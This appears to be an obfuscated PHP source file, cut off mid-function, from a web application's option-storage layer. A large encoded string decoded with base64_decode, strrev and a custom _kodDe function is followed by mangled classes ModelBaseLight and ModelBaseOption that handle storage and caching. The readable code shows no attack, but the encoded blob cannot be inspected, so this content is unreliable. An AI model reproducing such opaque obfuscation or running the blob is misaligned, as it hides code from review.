\x18\x10\x3a\x37\x98\x5a\x50\x9d\xd4\xc2\xc9\xae\xfe\x62\x51\x16"."\57\42\371\361\36\103\33\327\66\44\167\21\162\21\247\223\64\267\353\64\367\54\220\52\230\201\352\225\335\266\215\242\33\33\316\306\56\166\274\230\35\353\65\122\223\345\10\304\121\261\253\111\160"."\xca\x51\xa9\x48\x77\xc9\x48\xb9\x3f\x49\x44\x76\xbc\xa5\x12\xfb\x60\xc5\x46\xe5\xfb\x24\x2b\x40\x6\x11\xe6\xed\x39\xbc\xcb\x68\x68\xad\xf9\x8b\xa3\xdb\x79\x8d\xb8\x8c\x6b\xe5\xbe\x55\x96\xe7\x52\x4a\xc3\x8c\xc6".base64_decode('WfPQ/0B1MImjUoGpD6Ag871yvH+A4Rrh9IyNDS+45BHIkSymkXtaYUjKUU701uGyDwZKeUE=')."\x92\xb\x23\xf2\x16\x44\x51\x14\x96\xc3\x53\xb9\xab\xa7\xa\xd8\xda\x60\x6e\xbc\x24\x8d\x50\xbe\xe\x69\x16\x28\xf2\x2b\xbf\x26\x76\x46\x7f\x76\x48\xc\x80\xa0\x15\x0\xec\x21\xd4\x3f\x53\x5c\x9c\x8\xc9\x2a\x21"._kodDe('MlBwgJJWCx5+xwGBIIKIbwvU55dAll0LIZRrl/VEcoU/G4scaAf1wJ8FerzQGlNiC9PGk69K')."\254\304\164\65\11\223\230\206\273\10\176\207\23\217\372\113\203\214\110\167\133\270\123\222\23\224\22\324\140\113\247\32\350\352\252\230\41\177\303\217\205\154\174\114\107\30\173\157\245\241\5\350\132".strrev('Üµñ€Ÿóé¨'."\r".'øÕÙ¢^”UÆ©T¤( )Øƒò¯e’b¬R­NSR"±$¦')."\xe5\x4f\xc2\xcb\x28\xcb\xff\x90\xd4\x56\x61\x16\x4e\x51\x16\x68\xa\x9d\xba\xa6\x6a\xf2\xac\x52\xad\x64\xd0\x99\xce\xa5\x8d\x17\xba\x2b\x73\x8f\x7b\xb\xfc\x9a\x9c\x89\x77\x4e\xcc\x64\x77\x47\x7e\x5f\x1f\xe6\x6"."\x54\x2b\xbe\xa8\x5\x24\x9f\xd\xc4\xe5\x55\x50\xcb\x2f\x29\xaf\x82\x1b\xf7\x25\xe5\x2c\xe6\x1a\x35\x43\xf8\xc\xae\xd7\xd9\x5\x85\x85\xb\xf0\x43\x10\x13\xe9\xf3\x93\xc8\x2\x7f\x61\xa1\xbc\xda\x44\x5b\xac\xfc"."\143\176\302\146\362\13\276\206\112\235\330\126\176\276\344\257\166\25\340\10\213\337\240\215\300\344\36\264\344\20\6\112\161\134\100\67\40\243\13\163\51\150\206\303\233\215\55\111\114\225\260\166\47"."\171\3\52\12\147\200\153\327\322\206\260\247\246\365\353\313\323\100\6\333\235\25\50\30\356\44\14\160\356\64\314\55\22\151\350\334\163\176\206\2\273\134\110\244\260\62\364\127\324\211\164\266\211"."\x8\xbd\xe7\x3b\x32\x7b\x98\xf4\x14\x89\xf5\xf6\x54\xfb\xa6\xad\x5f\xef\x37\x98\xa4\x22\x93\x92\x62\x75\x7d\xbc\x34\x8d\xf7\xfa\x9c\xe5\xd1\x48\x60\xea\x79\x41\x48\x70\x97\xa4\x40\x75\xa\x40\xd1\x14\xff\x34\xa1"."\x2a\xca\x25\x12\x15\x2c\xa6\xd8\xd4\xb4\xb0\x87\x93\x5a\x7d\x2c\x4f\x25\x4c\x16\x79\xed\x18\xa9\x6a\xd4\xcf\x65\x40\x81\xee\x96\x89\xa5\x3c\x18\xec\x14\xc4\x38\xdf\x46\x14\x31\xf9\x8\xbb\x2f\xe0\xb4\x12\xbf\x48".base64_decode('+EuUURkNBwoFBwZiEfwgljX6/Rxt0EcyX1JoUrIiBGm50rGAoSsDmxogycMIw5pFjuZ4Omo=')."\213\47\2\230\143\124\44\141\36\236\275\300\112\26\215\202\355\100\203\324\23\170\25\161\255\67\250\15\153\264\110\225\2\254\274\246\52\342\42\245\12\155\151\232\303\160\37\357\340\2\374\65\104".base64_decode('H2ebqsggrIyuo/oEtVX6CKpYpTDkm9P4PBZtEx2oXDEPHJt2x0ChKdAJT5MnrKS/J57AIIk=')."\170\135\315\42\302\231\250\153\20\64\107\250\363\1\314\242\245\205\300\301\152\127\54\232\210\6\231\127\102\47\57\227\246\315\144\67\15\213\352\244\212\313\31\323\266\343\122\112\254\4\47\61\374"."\x90\x2\xd0\x50\x2c\xe5\xf3\x5c\x40\x14\xc3\x2b\x3f\x1a\x9b\x2a\xff\xd7\x43\x5e\x4f\xf5\x54\xdf\x24\xf9\x4a\x8f\xc6\xde\x56\x81\xe1\x4c\x1f\x8b\x99\x46\x29\xf4\x13\x1d\xc2\x9\x6c\x8\xc0\x82\x64\xc9\xc8\x2c\x36".strrev('ğT9åÕµi¾5Õ=ªÃüj¬ìSèßûGYñô’|s”•“B¨âb¹SSAÒÔ=|§«q').base64_decode('15mPperUU+IoE9xzAUVAdBqDkXCoM6GGgRiob5jjqxP6hoYljDbTcJCLLBV1Mqs+x7AqTA0=')."\175\217\111\160\261\125\75\357\140\317\322\51\315\232\314\234\160\103\135\135\235\267\256\36\375\317\364\60\230\21\323\106\146\377\104\52\122\127\327\110\376\247\31\344\115\4\100\320\231\203\120\42\303"."\xe5\xdc\x44\x94\xe\x1d\x82\xb3\x13\x5d\x97\x4b\x8c\x28\xed\x9\x62\x4d\x52\x5\x77\xd\x96\x45\x88\xdd\x22\xe8\x23\x56\x7e\x19\x5a\x75\xf8\x7c\x55\x88\x6c\x0\xc4\x74\x31\x9\x39\xc9\x4f\x69\x1c\xac\x42\xa7\x1d"."\xd0\xce\x9e\xe\xa8\x5\x78\x76\x6c\xa2\x4e\xa5\xc9\x4\x41\xdf\xb9\x92\x32\x2a\x26\x76\xd0\x7c\xaa\x3a\xde\xc4\x3b\x18\xca\xa7\x7a\xe4\x8f\xf9\xd8\x44\xd3\x44\xe1\x1c\xc1\xcb\x32\xbc\xb2\x8f\x22\xa8\x44\x91\x9e"."\x78\x5b\x74\x74\xd\xd5\x71\x9a\x12\xc6\x29\x88\x28\x4a\xf2\x31\xe3\x4\x89\x8d\x8b\xa9\x5f\xc9\x3c\x32\x8e\xca\x4f\x88\x24\x9b\x6b\xfa\x92\x58\x96\xdb\x58\xc1\xd1\x4e\xde\x12\x75\x85\x45\xed\xbf\xc0\x1c\x56\xd8".base64_decode('kRlzRBV0Co6ewmNkSvH1k4FkStLGxvPKziepOBd0E1JCQMAR6yBDRtZhvECVqspzOx8XZCM=')."\111\70\153\142\377\334\270\243\136\334\357\106\61\213\10\277\5\270\223\60\52\27\315\372\253\0\306\241\121\342\37\201\72\246\46\114\236\306\51\145\13\156\273\27\233\254\233\343\45\304\55\161\310"."\142\322\352\261\307\261\370\327\10\5\262\224\20\113\240\317\172\101\156\133\130\152\300\235\345\252\23\240\157\152\145\25\40\275\274\64\171\172\254\120\32\247\273\112\23\53\302\101\156\54\135\66\55"."\114\371\123\222\360\231\5\36\143\204\344\17\153\143\130\272\255\372\12\105\63\215\40\301\222\47\15\245\167\125\116\346\305\313\113\126\50\304\173\57\227\223\23\361\43\47\363\170\17\240\45\14\36"."\150\51\176\170\112\105\5\257\125\112\164\356\160\51\43\310\175\371\311\211\370\32\54\313\172\221\133\207\263\15\174\277\166\246\360\236\175\5\320\61\166\210\135\324\362\326\200\54\274\302\212\11\54"."\x85\x59\x55\xb2\xa7\x55\xd5\x1\x26\xc\x56\x99\x68\x19\x9e\x21\x21\xc4\xe1\x4c\xa7\x69\x94\x61\xe1\x78\x39\x4e\x10\xe4\x97\xd5\x13\xd0\x1d\x40\x8f\x64\x53\xe1\x6\x22\xcc\x43\x77\xdc\x61\x89\x1f\xc0\xb4\x91\xd1".base64_decode('KnI1Z94H51zKApezUnhauXdb+Y0OT6kq85Lwjm63bRhTBUB0AlsZVJFzHTfQyNGSFMOts+c=')."\121\164\351\6\303\62\36\234\254\120\317\361\112\136\347\146\46\234\213\52\127\0\217\172\46\242\56\261\241\162\271\22\156\253\333\205\242\26\163\54\211\143\274\257\224\264\143\142\261\312\124\137\3"."\x88\xec\x4e\x65\xbe\x74\x28\x8e\x16\x82\x19\x7e\x7\xf3\xdf\x87\x40\xa\xd3\x5a\xec\xe0\x47\x63\xed\x43\xf7\x23\x71\xec\xc0\x2a\xf5\x50\xb4\xcd\x3e\x84\xc7\x1\xa1\x14\x5b\x34\xc5\x79\xc\x4b\x87\x8a\x22\x37\x84"."\216\347\104\6\63\211\372\24\322\367\371\304\377\112\205\134\154\347\203\175\215\133\162\207\343\0\225\61\155\176\247\306\315\7\122\322\71\33\221\211\342\4\255\342\135\50\272\352\20\105\220\274\110".base64_decode('8KKoG6zzGusbkT0l3jqka74r6pbUxTUkMghFpSOaEAg2O+OZrw4h4UqCAit/cPU5LLBBAFc=')."\x5c\x12\x8c\xac\xd0\x3f\x68\x95\xb7\x89\x7b\x90\x17\x2\xb6\x40\xe9\x14\xf5\xa4\x59\x4c\xe1\x53\x52\xb2\xac\x93\xb7\x63\x7a\x5a\x8e\x12\xa9\x7\xb6\x45\x84\x9d\x7f\xb9\x9\x6c\x88\x4d\xc2\x45\x78\x6b\x6\x92\x76"."\111\66\353\46\271\2\101\61\311\133\214\104\275\172\353\25\116\366\252\264\145\32\231\56\145\220\362\225\50\140\27\253\127\122\232\43\334\257\170\251\237\77\142\273\150\121\246\207\247\310\244\36\123"."\254\303\15\20\303\126\170\4\226\234\207\232\305\46\370\305\310\344\52\344\233\145\125\150\36\246\266\204\6\236\234\143\141\247\57\335\154\25\53\345\124\370\24\311\222\146\64\311\311\157\230\35\61"."\111\220\61\246\63\321\160\157\175\203\167\6\134\173\144\255\74\166\243\203\303\5\155\54\11\14\360\235\230\341\66\20\254\206\162\242\214\51\211\3\20\373\117\302\234\15\61\172\305\327\223\130\307".base64_decode('4rGiRGDoXOiaGIeScb2QdKKy2LhAd6V8OkM4u8UhPe8qgPaHMx+8uojOUPtUpkOa0dUIeB8=')."\x92\xfd\xd6\x90\x5a\x62\x1c\x42\xc5\x0\x25\x99\xd4\x77\x8c\x34\x31\x42\x62\x8b\x9a\xcd\x62\x3a\x14\x1c\xc9\x89\xe4\x84\xc9\x13\xcb\xa5\xbe\x30\x54\x42\x93\xd4\x7c\x1\x5c\x93\x6b\x6a\xb1\xf9\x2\x7\x8b\xb2\x63".strrev('£êi‰`|Â+¹Iíó5\'Ÿ—{W}ëòŠÌÂ5/yµH%B#–œ\\°Ky™sr|J‰c™+Œ').base64_decode('OjOWmjOSSiTaFg4GIi3h+GIljZ9shfQi6q5Ktq1qCUdKxJeUc4MT/jRdDgbr/dw5EQ56+9E=').base64_decode('5cKb4pcyS1y/yAihMeEc0tkshUq9WNZiHqsRZsvqYK57hdJZwTSWCheKenn5MR1LUUo9lio=')."\224\52\364\6\312\127\376\2\361\54\45\227\106\64\223\236\237\254\363\106\176\330\260\14\201\16\130\215\61\271\365\100\113\107\270\123\15\104\42\321\245\16\51\144\361\336\120\344\334\227\224\354\30".base64_decode('TFoZsQj067KRSjnF4TnFxZGhyydbTS2wZzJwacy9/dCo5LivUNQMS5cSqI+5etDM07JZh3s=')."\xde\xec\x80\x14\x2d\x39\xcf\xdb\x8a\x9f\x52\xe9\x7\x58\x1a\xa1\x7e\x27\x2f\x10\xb\xb7\xb5\x27\xfe\xc7\x5d\x35\x52\xc2\xae\xa0\x91\x62\xf2\x6b\x5c\xb\x9b\x3a\x2\xa\xca\x4e\x9d\xd9\x37\x85\xbb\xa9\xf2\x94\xff"."\251\343\103\217\144\56\227\230\126\143\236\127\115\162\227\2\102\237\246\205\243\52\265\171\53\76\201\250\230\342\130\101\176\342\365\247\240\5\154\371\65\304\324\220\160\104\134\146\160\51\150\4\177"."\205\136\161\321\315\35\163\41\331\265\207\161\364\20\32\201\11\167\310\154\272\74\67\272\205\361\35\176\31\313\276\101\174\375\320\274\36\74\12\124\262\117\214\11\305\270\157\57\121\325\235\123\241"."\x3\x28\x5b\x11\xbc\x31\x5e\x40\x69\x52\xea\xa8\x8f\x51\xee\xb7\x49\x59\xc0\x6c\x4d\x88\xf\x10\x1b\x87\xa1\x5c\xc1\x76\x5c\xff\xdb\x65\xc5\x1c\x69\x49\x68\x2\x66\x14\x15\x39\xd7\x8f\xae\x39\x8b\xe2\x85\x65\x8f"."\xd1\xa6\x2a\x9f\x9d\x4\xf\x8b\x4b\x21\x16\xe7\x34\x73\x63\x65\x9\xe\x36\x5a\x84\x8d\x86\xb\x56\x63\x5f\x57\xf9\x1\x53\x9e\x75\x82\xcf\xb1\x6e\x16\x75\x1d\x4c\xb9\x13\x1e\x74\x1f\xd1\xed\x72\x67\x83\xb4\xfa"."\xff\x4d\x45\x9a\x19\x97\xcc\xf8\x3a\x1b\x29\xef\x90\xe5\x3e\x3f\x5\x2d\x87\xfd\x28\x66\xcc\x11\xa7\x3f\x61\x9c\xe2\xf6\x9c\xe8\xf0\x99\x28\xed\x30\x62\x39\x41\xf6\xf2\xe8\xac\xe4\x29\xf3\x39\xa6\x10\xa7\xf0\xa".base64_decode('Qkaw9lgIiN1+SWHp01PpTy/8stPQ3QmK5+CTtRwUgxkjmypy8S6R0KELlgSphRBLQctLziU=')."\235\176\63\321\70\52\271\323\304\266\117\235\336\332\204\23\74\161\364\72\235\202\161\231\2\113\154\41\313\166\270\241\113\230\11\55\355\241\240\212\221\242\210\65\217\311\141\131\330\237\214\2\145".base64_decode('MrZhiq/3QqkA81mb8hCPqRQvuv2oSfuTo1+5dpqY9ARZRIcmXxFd0XR2hDiK0SS/ViiIRxQ=').base64_decode('+cRFfx1K2pDXnWhXidkSlQpGxAXMSQ+bNBEeOUv5MH3McaQWpcujbACbPvAIXV8ojvrZRV8=')."\x74\x61\xc2\xe4\x26\xd9\x2b\x3b\x67\xc8\x23\x7c\xc4\xef\xd8\xfe\xf2\x57\x79\x2c\xb6\x6\x18\x5\x8b\x9\x31\xf9\xac\x21\x93\xdc\xd1\x7c\xf2\xed\xe\xa\x28\xb\x98\xc1\x19\x44\x73\x7a\x5\x94\x38\xf6\x34\x86\x2a"."\104\155\123\367\264\4\151\310\310\255\162\52\241\303\11\236\365\2\232\140\12\260\364\324\303\306\35\230\341\330\54\277\215\161\57\271\122\224\357\10\247\317\77\272\165\310\117\213\76\300\257\132\70"."\x2e\x88\xb\xd9\x76\x93\x10\xb\x72\xfb\xb5\x2d\xf7\xd1\xcb\xfc\xf1\xb2\xbd\x7\xce\x78\x2b\x78\xd8\x9d\xd4\x41\xaf\x47\xe8\x85\x7f\x95\x2b\x41\xa1\x85\x5c\x40\x6b\xe9\xf4\xb6\xcc\x49\x13\x7e\x9b\x29\xbb\x10\xb9"."\357\102\174\61\134\25\142\356\5\113\230\345\254\154\41\370\340\160\37\54\215\32\160\143\271\13\142\151\32\244\161\227\212\131\17\221\1\361\60\21\314\212\136\214\35\216\15\335\13\132\301\17\362".base64_decode('1zYI6hjkKphyos3GBf1F9ljuLmY4IB6d4EI1kdqdLjthludSDTNmzZNZLmIJxRMyWICBl3A=')."\x20\x92\x4\x50\x28\x4e\x30\x54\x98\xb1\x6b\x19\x7d\x90\x4c\xa7\x7e\x4f\xb9\xcb\x6c\xd7\x11\xf2\x3f\xdb\x30\xe2\xf6\x42\x8b\x4a\x62\xc2\xbc\xbd\x4a\x5e\x32\x25\x38\x95\xe4\xd7\xa4\x13\xd5\x25\x6d\x64\x62\x1\x20"."\x4b\xec\x3a\x7a\x86\xa\x47\xd9\xce\x6f\x51\xfa\xa3\xc2\x38\xa4\x83\x53\x6c\x16\xea\xfc\xd8\xcc\xe2\x9b\x7f\xe\x3f\x33\xd8\x45\xcd\x79\xa1\xad\x74\x6f\x23\x33\xc1\x2e\x89\x98\x53\x2c\x62\x4e\xf1\x2d\xe0\xf1\x88"."\154\351\142\47\267\150\233\156\6\25\256\216\17\126\302\154\215\346\263\160\356\143\243\31\142\267\111\230\350\177\260\200\354\216\106\257\163\102\156\15\17\337\161\265\167\316\202\377\144\206\146\52\70"."\xb8\x96\xc4\x74\xbe\x62\xc\x94\x54\xe4\x77\x53\xaf\x66\x7b\x25\xe0\x94\x18\x9c\xba\x1d\x25\x8b\xd\xe8\x42\x5c\xa1\x9d\xe3\x76\x35\x8f\xaa\x89\x36\xfa\x3c\xca\x64\x85\xca\xe9\x45\xc9\xf\xb6\x30\xd7\x28\x51\x8a"."\270\66\123\171\237\204\3\101\64\256\235\64\227\354\153\227\250\53\13\153\103\144\353\72\266\261\144\75\136\126\367\45\15\311\373\243\274\151\311\163\261\340\133\21\106\27\214\10\66\67\221\333\40".base64_decode('3Qy0cWVxTRJCdDLTgDoUmwTPveTU3pTDkkdsdCZEmTYH6o7jHoziwl66hL9SrkQ2ZwRpCPc=')._kodDe('MnDZimAw8lifrH7fXZrOCUkdI9m3BcuCPQv6FRpGXdWvVPlUgL3iNZud818klDGAn/3/LXU5')."\xae\x6f\x3c\xd3\x61\xb9\x1\x9b\x28\x74\x61\xc\x66\xf\xc2\x72\x79\x8c\xa7\xd6\xcf\x69\x98\xdd\x32\xfe\xd7\xae\x8d\xff\x5f\x79\x34\x9e\xc5\xbd\xc\x71\xbd\x40\xfc\x21\xae\x88\xd8\x6\x44\x3f\x74\x1b\xbf\xe6\x72"."\36\12\345\147\273\6\344\74\165\17\4\340\102\253\340\33\26\270\206\304\271\150\73\263\127\311\314\130\152\354\261\117\313\146\245\263\271\362\65\251\314\167\75\202\311\41\356\254\274\122\304\255\300"."\354\366\143\337\103\330\311\314\21\175\237\100\57\70\255\122\65\331\373\265\355\364\174\117\332\102\51\122\53\134\342\21\12\263\13\23\273\326\125\330\31\64\211\121\363\2\347\345\215\344\120\205\47"."\x7f\x22\xfb\xeb\xf4\x7f\x20\x11\x3f\x65\xc5\x44\xf7\x11\x8d\xc4\xc5\x8f\x59\x28\x89\xef\xb3\xc4\x6e\xe\x2c\x83\x6c\xdb\x20\x5a\x60\x37\xdf\x5a\x38\x65\xfa\x4e\x66\xd8\x90\xd8\x53\x1\xa4\x28\x23\x42\x47\x52\x19".base64_decode('+kw4FteRKK+bwHE+BheOGh0u59y0kCXPreNBo1wCpLw2xyxyFaya4OTd4WUl1546ryuh3us=')."\152\216\373\47\167\156\32\207\303\154\52\65\203\166\132\14\363\150\30\257\216\274\211\221\27\163\157\171\35\272\101\342\242\314\44\133\264\62\306\340\235\22\374\112\34\222\347\203\141\236\256\242\111"."\10\121\147\52\347\133\111\122\340\111\211\51\354\246\55\151\362\124\137\331\251\310\220\260\143\245\260\30\242\170\213\115\104\143\41\165\151\30\333\341\10\257\10\165\63\73\322\206\111\134\257\260\46".strrev('Ñf’ÅJÂâ÷8ò+YÔÏ2d#0ƒ)-é©Øåü‚ÎÙajJ=é(5jKt'."\0".'l^ˆj;»')."\222\55\211\72\62\61\131\147\242\334\30\273\350\17\60\171\217\356\74\332\321\172\322\326\123\12\246\24\34\227\207\236\231\165\63\372\276\252\271\231\314\31\43\52\71\363\153\112\302\55\46\76\303"."\xcb\x44\x97\x59\x99\x8a\xf5\x4c\x6a\x3d\xa8\x52\x1e\x2\xd2\xb8\xed\x80\x26\xe1\xe2\xc7\xed\xda\xc7\xe9\xca\xa7\x51\x62\xe6\x52\x2f\x49\xe\x1f\x60\x65\x8b\xd4\x69\x6\x5\xd\xe3\xca\xc3\x38\x62\xf2\x5c\x7c\xd"."\346\357\344\314\251\13\26\5\364\143\23\146\130\125\305\117\0\21\170\360\313\325\234\312\244\240\60\363\101\360\240\10\352\55\277\174\302\227\354\342\130\264\30\313\165\226\231\366\163\152\240\111\365".strrev('6Åú.FÌZ“e"#%¹–û+€”S¶[ÒC›lÌ’L‘½İ9Kït'."\0".'I$“|\'<›2Šg	').strrev('×,‚Ãj<q_!.•Âb”¾¬²-äñe·ò¡&A$ƒÁ%©Üvê×sq[aqï¦ÉÄÂÂ')."\302\124\252\225\271\240\164\24\115\351\156\53\174\50\205\27\45\144\275\144\154\104\50\26\351\43\362\327\241\234\120\344\161\24\54\117\25\306\110\244\372\342\75\121\14\23\247\125\32\76\101\206\316".base64_decode('6rKxEw5UIok6veJSOtIVHIsxCfEdOhTOaRKfdJpW4cX4mqEyRN3Q60h1MRUwU4/Rnq4sYHM=').base64_decode('Sc1X5IZJIKBnI1JzsqzBpBXilT8ioNI5xZJNGpHBqBvTMfnS8cYHBiVjcqajO+6lJXdgAb4=').strrev('R4C7k›-îáÇ•¡²l±zyfy{¤fNÃôå5£#ÜËŞ®ëËE™À^h$G14')."\326\37\111\220\51\141\126\250\103\173\124\261\32\315\302\65\305\205\310\121\167\222\51\300\165\151\26\256\133\226\315\52\227\315\53\251\147\153\45\153\222\341\225\117\36\260\305\122\25\6\54\230\107"."\x52\xd1\xc9\xe6\xb3\x62\xe1\xf2\xcf\x1\x24\xba\x4b\x13\x3e\x5a\xe5\x5e\x8\xf6\x97\x4b\x74\xa4\x52\x2f\x2a\x16\x9e\xb4\x17\xee\xd2\x82\x2a\xc1\xd7\xdf\x4a\x39\xe\xf9\x2b\xe7\x89\x52\x9\x6f\xb3\x9c\xa\x98\x9a"."\x62\xa1\x49\x5\xb3\x84\xb0\x52\xf9\x91\x21\xf2\x2a\x88\x4e\xd1\x4f\x62\xfa\x48\x36\x77\x59\x21\x5b\x96\xc3\xaa\x2c\xa9\x15\xab\x88\x65\x2c\xa7\x8\x95\x2b\x5d\x9e\x20\x30\xd6\xe\xc4\x36\x0\x30\x22\xd2\xb2\xc6"."\220\20\121\145\252\54\123\35\107\111\51\77\224\67\371\361\224\22\142\311\230\266\12\24\335\363\134\326\232\23\364\363\45\311\100\176\105\315\32\17\346\121\225\363\177\262\32\127\167\24\122\174\364".strrev('ùO£„xIG¡Â`$q{h…Ş\'Ğh’KESÌ!ÌÇ£1wÄ¬‘ö|Ò^­—áZwRFÚmz')."\101\374\322\306\37\161\211\201\170\172\204\323\354\270\131\264\75\70\57\141\26\310\157\263\151\333\102\62\206\62\245\10\41\216\317\141\217\44\370\205\102\342\305\26\167\212\274\377\21\260\45\30\213".base64_decode('BEGoADN54jrNJXjOEcHvijwiH7Pwathacok/iIQhM9VvjjJTkwiupEkSb4iam7Ycditiy2I=')."\x6c\xc4\xee\x8a\xe5\xa7\x39\x7e\x70\xf9\xe4\x25\x6d\x80\x43\x5a\xdf\x60\x21\xed\xa8\x4e\x3d\x67\x72\xc9\xf4\xaf\x6a\x1\xde\x11\x44\x13\xd4\xdf\xb\x61\xea\x82\x92\x5e\x3c\x11\x2f\xcb\xea\xa\xc4\xe3\x4b\xa3\xb1"."\26\352\36\246\54\233\324\222\204\5\313\262\272\332\243\235\223\345\205\72\2\341\110\131\36\226\53\354\124\205\321\122\232\25\356\42\275\44\357\350\223\365\42\34\134\54\172\122\156\53\226\75\333".base64_decode('RcAVqFgX6RmrkDHZ6xQrH9eyjG8kPXPoOWHVVtRxssPk9beY+WkecPpkdIn5MsCGhrCUYCc=')."\xb4\x1d\x2b\x40\x2a\x76\xab\xc3\xf1\x3\xa7\xf3\x85\xa8\x8a\xcf\x21\xd2\x22\xa5\x93\x3d\x44\x90\x92\x4\x9b\xf2\x79\x4f\x1e\x36\x39\x5f\x8c\x64\x4f\xab\x38\x5d\xf2\x23\x48\xf9\x3\x1d\xc9\x15\xd3\x81\xbb\x79\x8a"."\11\142\250\203\146\277\364\0\107\357\134\240\162\17\23\54\311\205\322\260\43\333\326\322\25\345\74\50\67\33\343\14\301\147\376\77\241\77\21\55\36\274\0\0".""."".strrev('').base64_decode(''), 10, -8))); goto C›µò–˜Ê†; E˜Îñ¦‰“: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\x65\x6d\117\160\x74\151\x6f\156"; public $field = array(); public function listData($¢Å©Èµœ = false, $ô¸Ë˜ù† = "\x6d\x6f\x64\151\x66\171\124\151\x6d\x65", $³„‰´Œ­ = false) { $‹‡Ê”Óâ = Model($this->modelType)->get(!1, $this->optionType, !0); $öÖéå‚ = array_values($‹‡Ê”Óâ); if ($öÖéå‚ && $öÖéå‚[0] && !is_array($öÖéå‚[0])) { Model($this->modelType)->cacheRemove($this->optionType); $‹‡Ê”Óâ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‹‡Ê”Óâ) { return $¢Å©Èµœ ? null : array(); } if (!$¢Å©Èµœ) { $‹‡Ê”Óâ = array_filter(array_values($‹‡Ê”Óâ)); return array_sort_by($‹‡Ê”Óâ, $ô¸Ë˜ù†, $³„‰´Œ­); } return $‹‡Ê”Óâ[$_SERVER[ÅÄÇĞô][475] . $¢Å©Èµœ]; } public function insert($·Í¼«Çş) { $ä³á“Õ =& $_SERVER[ÅÄÇĞô]; $·Í¼«Çş = array_field_key($·Í¼«Çş, $this->field); $ÂÌ©â¬˜ = Model($this->modelType)->get($ä³á“Õ[476], $this->optionType . $ä³á“Õ[477]); $ÂÌ©â¬˜ = $ÂÌ©â¬˜ ? $ÂÌ©â¬˜ : 0; $·Í¼«Çş[$ä³á“Õ[478]] = ++$ÂÌ©â¬˜; $·Í¼«Çş[$ä³á“Õ[234]] = time(); $·Í¼«Çş[$ä³á“Õ[88]] = time(); Model($this->modelType)->set($ä³á“Õ[476], $ÂÌ©â¬˜, $this->optionType . $ä³á“Õ[477]); Model($this->modelType)->set($ä³á“Õ[475] . $ÂÌ©â¬˜, $·Í¼«Çş, $this->optionType); return $ÂÌ©â¬˜; } public function update($şÉß›Âà, $ì¾·ãÙ¯) { $ßßÏ££ =& $_SERVER[ÅÄÇĞô]; $ì¾·ãÙ¯ = array_field_key($ì¾·ãÙ¯, $this->field); $õ¶‚¢© = $this->listData($şÉß›Âà); if (!$õ¶‚¢© || !$şÉß›Âà) { return !1; } $ì¾·ãÙ¯ = array_merge($õ¶‚¢©, $ì¾·ãÙ¯); $ì¾·ãÙ¯[$ßßÏ££[88]] = time(); return Model($this->modelType)->set($ßßÏ££[475] . $şÉß›Âà, $ì¾·ãÙ¯, $this->optionType); } public function remove($÷­¯«àß) { if (!$÷­¯«àß) { return !1; } return Model($this->modelType)->remove($_SERVER[ÅÄÇĞô][475] . $÷­¯«àß, $this->optionType); } public function clear() { $îïêİçœ =& $_SERVER[ÅÄÇĞô]; Model($this->modelType)->remove($îïêİçœ[476], $this->optionType . $îïêİçœ[477]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($£¦ÍúİÍ, $×®œòÎ‰) { if (!$×®œòÎ‰) { return !1; } $¹¶Óå¨Ä = $this->listData(); $¹¶Óå¨Ä = array_to_keyvalue($¹¶Óå¨Ä, $£¦ÍúİÍ); return isset($¹¶Óå¨Ä[$×®œòÎ‰]) ? $¹¶Óå¨Ä[$×®œòÎ‰] : !1; } public function findByName($ª®­éŞ ) { return $this->findByKey($_SERVER[ÅÄÇĞô][32], $ª®­éŞ ); } protected function resetData($âáÈõ) { $éå¬”¹¯ =& $_SERVER[ÅÄÇĞô]; $âáÈõ = is_array($âáÈõ) ? $âáÈõ : array(); $ˆ•ïÁÏ = array(); for ($½à»ê¢ = 0; $½à»ê¢ < count($âáÈõ); $½à»ê¢++) { $ˆ•ïÁÏ[$éå¬”¹¯[475] . $âáÈõ[$½à»ê¢][$éå¬”¹¯[478]]] = $âáÈõ[$½à»ê¢]; } return Model($this->modelType)->set($ˆ•ïÁÏ, !1, $this->optionType); } private function getAutoName($™èó¨­è) { $“²”é« = array_to_keyvalue($this->listData(), $_SERVER[ÅÄÇĞô][32]); if (!$“²”é« || !isset($“²”é«[$™èó¨­è])) { return $™èó¨­è; } for ($õæíôÜŒ = 1; $õæíôÜŒ < count($“²”é«); $õæíôÜŒ++) { $Ã–ŒĞ¬Õ = $™èó¨­è . "\x28{$õæíôÜŒ}\51"; if (!isset($“²”é«[$Ã–ŒĞ¬Õ])) { return $Ã–ŒĞ¬Õ; } } return $Ã–ŒĞ¬Õ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ö»ïñš = false, $¼óü½¿ë = '', $ùéÜá½Õ = false) { $®©›ôÕ¿ =& $_SERVER[ÅÄÇĞô]; $Ö²îó¦µ = $this->cacheGet($¼óü½¿ë); $û¢“äÉ¶ = $this->optionDefault($¼óü½¿ë); $û¢“äÉ¶ = is_array($û¢“äÉ¶) ? $û¢“äÉ¶ : array(); if (is_array($Ö²îó¦µ)) { $Ö²îó¦µ = array_merge($û¢“äÉ¶, $Ö²îó¦µ); return $Ö»ïñš ? isset($Ö²îó¦µ[$Ö»ïñš]) ? $Ö²îó¦µ[$Ö»ïñš] : null : $Ö²îó¦µ; } $æÙƒŞ¹Õ = $this->filterWhere(array($®©›ôÕ¿[33] => $¼óü½¿ë)); $Ö²îó¦µ = $this->where($æÙƒŞ¹Õ)->select(); $Ö²îó¦µ = array_to_keyvalue($Ö²îó¦µ, $®©›ôÕ¿[97], $®©›ôÕ¿[453]); foreach ($Ö²îó¦µ as $âİ˜†Å => $ğÚØÓŠˆ) { if ($ùéÜá½Õ || in_array($âİ˜†Å, $this->jsonField)) { $Ö²îó¦µ[$âİ˜†Å] = json_decode($ğÚØÓŠˆ, !0); } } $this->cacheSet($¼óü½¿ë, $Ö²îó¦µ); $Ö²îó¦µ = array_merge($û¢“äÉ¶, $Ö²îó¦µ); return $Ö»ïñš ? $Ö²îó¦µ[$Ö»ïñš] : $Ö²îó¦µ; } public function set($†óáóÁ, $º¦ƒ™µÄ = false, $ˆüÄô×ø = '') { $÷ıÇÀÄ =& $_SERVER[ÅÄÇĞô]; $this->cacheRemove($ˆüÄô×ø); $Á½«à¯ = array(); $‰İÖ¿Ù = is_array($†óáóÁ) ? $†óáóÁ : array($†óáóÁ => $º¦ƒ™µÄ); foreach 